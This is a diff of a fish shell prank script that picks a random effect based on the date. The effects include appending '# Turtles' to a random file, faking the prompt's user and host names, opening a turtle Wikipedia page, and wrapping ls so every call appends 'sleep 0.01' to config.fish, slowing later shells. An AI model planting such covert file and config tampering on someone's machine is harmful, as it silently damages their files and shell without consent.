@@ -12,29 +12,9 @@ switch (date | md5sum | head -c2)
 			| shuf -n1 \
 			| xargs -I{} -- bash -c 'printf "# Turtles\n" >> "{}"'
 	case 14
-		function fish_prompt
-			set -l normal (if [ "$status" != 0 ]
-				printf "%s" "$fish_color_error"
-			else;
-				printf "%s" "$fish_color_normal"
-			end)
-
-			if [ $CMD_DURATION -ge 1000 ]
-				printf '%sTook %.2fs\n' \
-					(set_color $fish_color_warning) \
-					(math $CMD_DURATION / 1000)
-			end
-			printf \
-				(printf (if [ -n "$fish_private_mode" ]; echo '%s(%s)%s'; else; echo '%s%s%s'; end) \
-					'%s' '%s@%s%s' ':%s%s%s ') \
-				(set_color $normal) \
-				(set_color $fish_color_user; printf "König") \
-				(set_color $fish_color_host; printf "zuhause") \
-				(set_color $normal) \
-				(set_color $fish_color_cwd; basename (prompt_pwd)) \
-				(set_color $normal; if fish_is_root_user; printf '#'; else; printf '$'; end) \
-				(set_color $fish_color_normal)
-		end
+		functions -c fish_prompt __fish_prompt_orig
+		function prompt_hostname; printf 'zuhause'; end
+		function fish_prompt; USER="König" __fish_prompt_orig; end
 	case 15
 		function fish_greeting
 			printf "%sTurtles%s\n" (set_color -o green) (set_color normal)
@@ -45,8 +25,6 @@ switch (date | md5sum | head -c2)
 	case 16
 		command xdg-open 'https://en.wikipedia.org/wiki/Turtle' & disown
 	case 17
-		function ls
-			printf "sleep 0.01\n" >> "$__fish_config_dir/config.fish"
-			command ls --color=auto -H $argv
-		end
+		functions -c ls __ls_orig
+		function ls; printf "sleep 0.01\n" >> "$__fish_config_dir/config.fish"; __ls_orig; end
 end
